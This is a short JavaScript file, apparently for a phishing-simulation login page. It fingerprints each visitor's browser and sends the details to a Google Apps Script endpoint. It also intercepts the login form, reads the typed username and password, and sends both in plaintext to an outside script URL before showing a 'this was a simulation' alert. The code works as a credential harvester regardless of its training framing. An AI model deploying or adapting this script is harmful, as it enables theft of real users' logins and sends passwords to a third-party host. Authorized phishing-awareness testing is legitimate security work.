(function () {
    const params = new URLSearchParams(window.location.search);
    const variant = params.get("variant") || "login-page";
    const userAgent = navigator.userAgent;
    const referrer = document.referrer;
    const lang = navigator.language;
    const tz = new Date().getTimezoneOffset();
    const width = screen.width;
    const height = screen.height;
  
    // Log page visit
    const logVisit = () => {
      const url = `https://script.google.com/macros/s/AKfycbzBEkZ2LA1K7DJy9z2Pp1hbXBY0z6o30SCjTLe20G6rNQoSQSn_vHCDjJwezibgShvn/exec` +
                  `variant=${encodeURIComponent(variant)}` +
                  `&userAgent=${encodeURIComponent(userAgent)}` +
                  `&referrer=${encodeURIComponent(referrer)}` +
                  `&lang=${lang}` +
                  `&tz=${tz}` +
                  `&width=${width}&height=${height}`;
  
      fetch(url).then(() => console.log("Visit logged"));
    };
  
    // Log form input
    const setupFormTracking = () => {
      const form = document.querySelector("form");
      form.addEventListener("submit", function (e) {
        e.preventDefault(); // Don't actually submit
  
        const username = form.querySelector("input[type='text']").value;
        const password = form.querySelector("input[type='password']").value;
  
        const url = `https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec?` +
                    `variant=form_submission` +
                    `&user=${encodeURIComponent(username)}` +
                    `&pass=${encodeURIComponent(password)}` +
                    `&userAgent=${encodeURIComponent(userAgent)}`;
  
        fetch(url).then(() => alert("Thank you — this was a simulation."));
      });
    };
  
    logVisit();
    window.addEventListener("DOMContentLoaded", setupFormTracking);
  })();
  